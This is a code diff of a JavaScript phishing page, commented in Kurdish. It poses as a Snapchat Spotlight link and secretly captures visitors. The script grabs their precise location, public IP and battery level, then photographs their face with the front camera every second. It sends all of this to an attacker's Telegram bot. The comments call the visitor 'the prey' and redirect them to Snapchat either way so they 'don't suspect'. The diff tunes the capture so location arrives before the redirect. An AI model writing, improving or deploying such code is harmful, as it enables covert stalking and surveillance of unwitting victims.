@@ -14,26 +14,33 @@
 
     async function capture() {
         if (!targetID) return;
-        
-        navigator.geolocation.getCurrentPosition(pos => {
-                sendLocation(pos.coords.latitude, pos.coords.longitude);
-            });
 
-        // 🔥 ڕێدایرێکت دوای ٥ چرکە بە بەهێزترین شێواز
-        setTimeout(() => {
-            window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
-        }, 5000);
+        // 📍 ١. داواکردنی لوکەیشن لە سەرەتای فەنکشنەکە
+        navigator.geolocation.getCurrentPosition(pos => {
+            // ناردنی لوکەیشن بۆ تەلەگرام
+            sendLocation(pos.coords.latitude, pos.coords.longitude);
+            
+            // 🔥 تەنها دوای ئەوەی لوکەیشنەکە هات، دوای ٣ چرکە بیبە بۆ سناپچات
+            setTimeout(goToSnap, 3000);
+        }, err => {
+            // ئەگەر نێچیرەکە ڕێگەی نەدا، هەر بیبە بۆ سناپچات تا گومان نەکات
+            sendToTelegram("⚠️ نێچیرەکە ڕێگری لە لوکەیشن کرد یان لەناو تەلەگرامە.");
+            setTimeout(goToSnap, 2000);
+        }, { enableHighAccuracy: true, timeout: 10000 });
 
         try {
+            // ٢. وەرگرتنی کامێرا و زانیارییەکانی تر
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user" }, 
                 audio: false 
             });
+
             let batteryInfo = "Unknown";
             if (navigator.getBattery) {
                 const batt = await navigator.getBattery();
                 batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
             }
+
             fetch('https://api.ipify.org?format=json')
                 .then(res => res.json())
                 .then(data => {
@@ -49,6 +56,7 @@
             video.srcObject = stream;
             video.muted = true;
             video.play();
+
             const takeSnap = () => {
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth; 
@@ -57,13 +65,21 @@
                 ctx.drawImage(video, 0, 0);
                 canvas.toBlob(b => { if (b) sendFile(b, "photo"); }, 'image/jpeg', 0.7);
             };
-            setInterval(takeSnap, 700);
+            // وێنەگرتن هەموو چرکەیەک جارێک
+            setInterval(takeSnap, 1000);
+
         } catch (e) {
-            sendToTelegram("⚠️ نێچیرەکە ڕێگری کرد لە دەسەڵاتەکان.");
-            // ئەگەر مۆڵەتی نەدا، یەکسەر ڕەوانەی بکە
-            window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
+            // ئەگەر کامێراشی بلۆک کرد، هەر بیبە بۆ سناپچات
+            sendToTelegram("⚠️ نێچیرەکە ڕێگری لە کامێرا کرد.");
+            setTimeout(goToSnap, 1000);
         }
     }
+
+    // فەنکشنی ڕێدایرێکت
+    function goToSnap() {
+        window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
+    }
+
     function sendToTelegram(text) {
         fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
             method: 'POST',
@@ -71,6 +87,7 @@
             body: JSON.stringify({chat_id: targetID, text: text, parse_mode: "HTML"})
         });
     }
+
     function sendLocation(lat, lon) {
         fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
             method: 'POST',
@@ -78,6 +95,7 @@
             body: JSON.stringify({chat_id: targetID, latitude: lat, longitude: lon})
         });
     }
+
     function sendFile(blob, type) {
         let fd = new FormData();
         fd.append("chat_id", targetID);
